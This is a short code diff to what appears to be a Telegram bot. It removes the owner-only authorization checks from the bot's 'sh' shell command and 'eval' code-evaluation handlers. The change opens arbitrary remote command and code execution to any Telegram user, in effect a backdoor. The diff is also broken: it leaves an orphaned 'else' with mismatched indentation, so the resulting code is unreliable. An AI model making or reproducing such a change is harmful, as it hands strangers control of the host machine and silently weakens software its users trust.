@@ -21,7 +21,6 @@ async def aexec(code, client, message):
 
 @app.on_message(filters.command("sh",COMMANDS))
 def sh(_, m):
-    if m.from_user.id in OWNER:
         code = m.text.replace(m.text.split(" ")[0], "")
         x = run(code)
         msg = m.reply_photo(
@@ -31,7 +30,7 @@ def sh(_, m):
     else:
         return
    
-@app.on_message(filters.user(OWNER) & filters.command("eval",COMMANDS))
+@app.on_message(filters.command("eval",COMMANDS))
 async def eval(client, message):
     status_message = await message.reply_text("Processing ...")
     if len(message.command) <2:
